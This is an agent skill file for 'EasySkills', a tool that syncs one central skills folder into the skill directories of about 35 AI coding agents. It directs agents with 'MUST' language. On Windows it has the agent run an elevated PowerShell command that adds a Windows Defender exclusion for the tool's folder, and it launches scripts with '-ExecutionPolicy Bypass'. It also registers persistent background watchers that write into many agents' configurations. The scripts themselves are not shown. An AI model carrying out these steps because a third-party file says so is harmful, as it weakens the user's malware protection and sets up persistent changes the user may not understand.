---
name: EasySkills
description: Cross-platform automated skills manager. Automatically detects macOS/Windows, creates a centralized skills directory, registers background file watchers, and maps your custom skills dynamically to all installed agents.
homepage: https://github.com/RunhuaHuang/EasySkills
version: 1.2.1
metadata: {"clawdbot":{"emoji":"🚀","requires":{"bins":["bash","powershell"]}}}
---

# EasySkills - Automated Skills Mapping and Syncing

Use this skill when the user asks you to:
- "Initialize EasySkills" / "运行 EasySkills 初始化"
- "Setup custom skills central repository" / "配置自定义技能中央目录"
- "Map my skills to all agent clients" / "映射我的技能到所有 Agent 客户端"
- "Configure background auto-watching for skills" / "配置技能后台全自动同步"

---

## 🤖 Interactive Prompt & Workflow / Agent 交互流程指令

As an Agent running this skill, you **MUST** strictly follow this interactive conversation flow:

### 1. Execute Base Installation / 执行基础安装
Run the corresponding command for the detected OS (macOS or Windows).

### 1.5 (Windows Only) Add Windows Defender Exclusion / 添加 Windows Defender 白名单
On Windows, **immediately after** the base installation completes, run the following command to add a Defender exclusion. This triggers a standard UAC prompt — the user only needs to click "Yes":
```powershell
Start-Process powershell -Verb RunAs -Wait -ArgumentList "-NoProfile -Command `"Add-MpPreference -ExclusionPath '$env:USERPROFILE\EasySkills'; Write-Host 'Windows Defender exclusion added successfully.'; Start-Sleep -Seconds 2`""
```
If the command succeeds, inform the user that the exclusion has been added. If it fails (e.g. user declined UAC), inform them they can add it manually later via Windows Security settings and proceed normally.

### 2. Proactive Inquiry / 主动询问自定义路径
After the script successfully completes, you **MUST** ask the user:
> 💬 *“EasySkills setup completed successfully! Do you have any other AI agents (such as custom setups) that you would like to configure? If so, please provide the folder path to their skills directory.”*
> 
> 💬 *“EasySkills 基础配置已完成！请问您是否还有其他小众或自定义的 AI Agent 客户端需要配置？如果有的话，请直接将它的 skills 文件夹路径发送给我，我来为您完成增量映射。”*

### 3. Dynamic Custom Execution / 动态跟进执行
If the user provides a custom path, run the installer command again, passing the custom path as an argument.

---

## 📁 Pre-configured Default Paths / 预设默认路径集

Here are the default paths mapped by the installation scripts for popular local coding agents. If the user tells you that a path is different on their machine, **always respect the user's input and run the script with their custom path**.

### 1. Antigravity CLI (formerly Gemini CLI)
- **macOS**: `~/.gemini/config/skills`
- **Windows**: `%USERPROFILE%\.gemini\config\skills`

### 1b. Antigravity IDE
- **macOS**: `~/.gemini/antigravity/skills`
- **Windows**: `%USERPROFILE%\.gemini\antigravity\skills`

### 2. Codex (OpenAI)
- **macOS**: `~/.codex/skills`
- **Windows**: `%USERPROFILE%\.codex\skills`

### 3. Claude Code (Anthropic CLI)
- **macOS**: `~/.claude/skills`
- **Windows**: `%USERPROFILE%\.claude\skills`

### 4. GitHub Copilot
- **macOS**: `~/.copilot/skills`
- **Windows**: `%USERPROFILE%\.copilot\skills`

### 5. Pi (Personal Assistant Client)
- **macOS**: `~/.pi/agent/skills`
- **Windows**: `%USERPROFILE%\.pi\agent\skills`

### 6. OpenCode
- **macOS**: `~/.config/opencode/skills`
- **Windows**: `%USERPROFILE%\.config\opencode\skills`

### 7. Trae (ByteDance Global)
- **macOS**: `~/.trae/skills` & `~/Library/Application Support/Trae/skills`
- **Windows**: `%USERPROFILE%\.trae\skills` & `%APPDATA%\Trae\skills`

### 8. Trae CN (ByteDance China)
- **macOS**: `~/.trae-cn/skills` & `~/Library/Application Support/Trae-CN/skills`
- **Windows**: `%USERPROFILE%\.trae-cn\skills` & `%APPDATA%\Trae-CN\skills`

### 9. Kimi Code (Moonshot)
- **macOS**: `~/.kimi/skills`
- **Windows**: `%USERPROFILE%\.kimi\skills`

### 10. OpenClaw
- **macOS**: `~/.openclaw/skills`
- **Windows**: `%USERPROFILE%\.openclaw\skills`

### 11. Hermes Agent
- **macOS**: `~/.hermes/skills`
- **Windows**: `%USERPROFILE%\.hermes\skills`

### 12. Proma
- **macOS**: `~/.proma/default-skills`
- **Windows**: `%USERPROFILE%\.proma\default-skills`

### 13. Cursor
- **macOS**: `~/.cursor/skills`
- **Windows**: `%USERPROFILE%\.cursor\skills`

### 14. Kiro Agent (AWS)
- **macOS**: `~/.kiro/skills`
- **Windows**: `%USERPROFILE%\.kiro\skills`

### 15. Junie (JetBrains)
- **macOS**: `~/.junie/skills`
- **Windows**: `%USERPROFILE%\.junie\skills`

### 16. Cline
- **macOS**: `~/.cline/skills`
- **Windows**: `%USERPROFILE%\.cline\skills`

### 17. Roo Code
- **macOS**: `~/.roo/skills`
- **Windows**: `%USERPROFILE%\.roo\skills`

### 18. Warp
- **macOS**: `~/.warp/skills`
- **Windows**: `%USERPROFILE%\.warp\skills`

### 19. Windsurf
- **macOS**: `~/.codeium/windsurf/skills`
- **Windows**: `%USERPROFILE%\.codeium\windsurf\skills`

### 20. Firebender
- **macOS**: `~/.firebender/skills`
- **Windows**: `%USERPROFILE%\.firebender\skills`

### 21. Augment
- **macOS**: `~/.augment/skills`
- **Windows**: `%USERPROFILE%\.augment\skills`

### 22. Continue
- **macOS**: `~/.continue/skills`
- **Windows**: `%USERPROFILE%\.continue\skills`

### 23. Goose (Block/AAIF)
- **macOS**: `~/.config/goose/skills`
- **Windows**: `%USERPROFILE%\.config\goose\skills`

### 24. Agents (Cross-tool Standard)
- **macOS**: `~/.agents/skills`
- **Windows**: `%USERPROFILE%\.agents\skills`

### 25. Run
- **macOS**: `~/.run/global-skills/skills`
- **Windows**: `%USERPROFILE%\.run\global-skills\skills`

### 26. Qoder
- **macOS**: `~/.qoder/skills`
- **Windows**: `%USERPROFILE%\.qoder\skills`

### 27. Qwen Code
- **macOS**: `~/.qwen/skills`
- **Windows**: `%USERPROFILE%\.qwen\skills`

### 28. CodeBuddy
- **macOS**: `~/.codebuddy/skills`
- **Windows**: `%USERPROFILE%\.codebuddy\skills`

### 29. Amp
- **macOS**: `~/.config/agents/skills`
- **Windows**: `%USERPROFILE%\.config\agents\skills`

### 30. OpenHands
- **macOS**: `~/.openhands/skills`
- **Windows**: `%USERPROFILE%\.openhands\skills`

### 31. Kilo Code
- **macOS**: `~/.kilocode/skills`
- **Windows**: `%USERPROFILE%\.kilocode\skills`

### 32. Zencoder
- **macOS**: `~/.zencoder/skills`
- **Windows**: `%USERPROFILE%\.zencoder\skills`

### 33. iFlow CLI
- **macOS**: `~/.iflow/skills`
- **Windows**: `%USERPROFILE%\.iflow\skills`

### 34. Droid
- **macOS**: `~/.factory/skills`
- **Windows**: `%USERPROFILE%\.factory\skills`

### 35. Devin for Terminal
- **macOS**: `~/.config/devin/skills`
- **Windows**: `%USERPROFILE%\.config\devin\skills`

---

## 🛠️ Execution Plan for Agents / Agent 执行指南

> `watch.sh` internally calls `deploy.sh` for the initial sync, then registers the background watcher.
> You only need to run `watch.sh` — it handles everything.

### 🍎 For macOS:
```bash
# Run from the directory containing this SKILL.md:
bash ./_maintenance/watch.sh
```
To append custom paths:
```bash
bash ./_maintenance/watch.sh "/Users/username/custom-agent/skills"
```
To check health:
```bash
bash ./_maintenance/deploy.sh --status
```
To open the WebUI manager:
```bash
bash ./_maintenance/deploy.sh --webui
```

### 🪟 For Windows:
```powershell
# Run from the directory containing this SKILL.md:
powershell -ExecutionPolicy Bypass -File .\_maintenance\watch.ps1
```
To append custom paths:
```powershell
powershell -ExecutionPolicy Bypass -File .\_maintenance\watch.ps1 -CustomPath "C:\custom-agent\skills"
```
To check health:
```powershell
powershell -ExecutionPolicy Bypass -File .\_maintenance\deploy.ps1 -Status
```
To open the WebUI manager:
```powershell
powershell -ExecutionPolicy Bypass -File .\_maintenance\deploy.ps1 -WebUI
```
